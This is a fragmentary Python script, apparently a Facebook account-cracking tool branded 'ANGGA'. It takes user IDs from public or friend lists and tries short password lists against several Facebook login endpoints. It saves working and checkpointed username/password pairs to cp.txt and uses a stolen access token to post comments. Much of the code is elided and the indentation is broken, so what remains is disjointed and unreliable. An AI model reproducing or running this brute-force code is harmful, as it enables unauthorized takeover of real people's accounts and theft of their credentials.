...
def bot_follow():
	...
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message=' +komen+ '&access_token=' + toket)
...
def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" \033[1;96mApi \033[1;97m\033[1;93m[ "+h+"Fast Recommended"+p+" \033[1;93m]\033[1;97m"))
  print((k+"["+p+"2"+k+"]"+p+" \033[1;96mApi + TTL \033[1;97m\033[1;93m[ "+h+"Fast"+p+" \033[1;93m]\033[1;97m"))
  print((k+"["+p+"3"+k+"]"+p+" \033[1;96mMbasic \033[1;97m\033[1;93m[ "+h+"Slow Recommended"+p+" \033[1;93m]\033[1;97m"))
  print((k+"["+p+"4"+k+"]"+p+" \033[1;96mMbasic + TTL \033[1;97m\033[1;93m[ "+h+"Slow"+p+" \033[1;93m]\033[1;97m"))
  print((k+"["+p+"5"+k+"]"+p+" \033[1;96mFree Facebook \033[1;97m\033[1;93m[ "+h+"Super Slow"+p+" \033[1;93m]\033[1;97m"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" \033[1;96mChoose \033[1;97m: ")
  if krah in[""]:
    print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
    pilihcrack(file)
...
def publik():
	try:
		...
		logs()
	try:
		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Crack From Friendlist"))
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,National,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mANGGA_CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mANGGA_OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
			...
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCp: ")
		except:
			self.main(fl)
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : 123123,12345,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					...
					print(("\r\x1b[0;33m[\x1b[0;37mANGGA_CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
...
class bapi:
        ...
        try:
          while True:
            try:
              ...
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : Micheal,22334455,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[0;32m[\x1b[0;37mANGGA_OK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\x1b[0;37mANGGA_CP\x1b[0;33m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
        ...
        try:
          while True:
            try:
              ...
              continue
          self.fl=[]
          print((k+"["+p+"•"+k+"]"+p+" Example : David12,223344,123456"))
          self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      if "www.facebook.com" in response.json()["error_msg"]:
        ...
        print(("\r\x1b[0;33m[\x1b[0;37mANGGA_CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(username,password,ttl)))
        save = open("cp.txt", "a+")
